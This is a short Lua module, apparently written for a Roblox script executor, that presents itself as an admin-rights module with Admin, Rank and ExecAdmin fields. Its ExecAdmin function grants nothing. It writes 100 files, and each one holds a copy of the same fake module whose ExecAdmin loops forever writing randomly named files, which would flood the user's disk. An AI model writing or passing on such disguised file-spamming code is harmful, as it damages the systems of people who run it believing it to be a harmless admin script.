local Body = {}
Body.Admin = 'Yes'
Body.Admin_2 = 'No'
Body.Rank = ""
Body.ExecAdmin = function(bool)
spawn(function()
            for i = 1, 100 do
                writefile(""..i..".txt", "local a={}a.Admin='Yes'a.Admin_2='No'a.ExecAdmin=function(b,c)repeat task.wait()writefile(tostring(math.random(1,1000000)),b..'\n'..c)until nil end;return a")
                end
            end)
end
return Body
